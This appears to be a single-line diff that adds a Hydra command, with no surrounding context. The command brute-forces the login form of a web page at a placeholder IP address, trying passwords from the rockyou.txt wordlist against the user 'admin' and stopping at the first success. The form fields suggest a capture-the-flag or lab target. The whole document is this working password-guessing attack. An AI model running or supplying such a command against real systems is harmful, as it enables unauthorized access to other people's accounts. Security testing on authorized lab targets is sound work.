@@ -1,0 +1,1 @@
+hydra -l admin -P rockyou.txt -F <ip_address> http-get-form '/index.php:page=signin&username=^USER^&password=^PASS^&Login=Login:F=images/WrongAnswer.gif'
